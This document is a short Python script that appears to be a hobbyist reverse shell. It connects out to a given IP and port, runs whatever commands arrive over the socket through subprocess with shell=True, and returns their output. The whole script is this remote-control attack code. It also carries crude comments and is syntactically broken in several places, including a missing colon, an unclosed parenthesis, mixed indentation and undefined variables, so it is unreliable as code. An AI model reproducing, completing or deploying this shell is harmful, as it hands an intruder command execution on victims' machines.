#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

# Pitt sucks

import socket, subprocess, argparse

def arguments():
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-t', '--target', metavar='1.1.1.1', type=str)
    parser.add_argument('-p', '--port', metavar='6969', type=int)
    args = parser.parse_args()


def logo():
    print ("""

Hit or miss, I guess they never miss.. huh?                                                                                        
                  
                  - Plaintexticus
    
    """)

def preparation():
    """ Checks the cli arguments for network details and requests them if not supplied. """
    target = args.target
    port = args.port
    if port is None:
        port = input('Input target port.')
    if target is None:
        target = input('Input target IP address.')
        try:
            socket.inet_aton(target)
            if not int(port):
                raise OSError
        except OSError:
            print('Error 01: You supplied Invalid Network details. {}, {}'.format(target, port)
            exit(1)
    return((target, port))
    
                  
#going to refactor below when I have more time.
def connection(networking)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect(networking)
    except socket.error:
        print("Connection Failed.")
		exit(1)
    CMD = subprocess.Popen(['echo', 'pittsux'], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    s.send(CMD.stdout.read())
    while True:
		#Not sure about this.
        command = s.recv(1024)
        if 'exit' in command:
            s.close()
        else:
            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

# Fuck menus.

                  
def main():
	logo()
	networking = arguments()
	connection(networking)
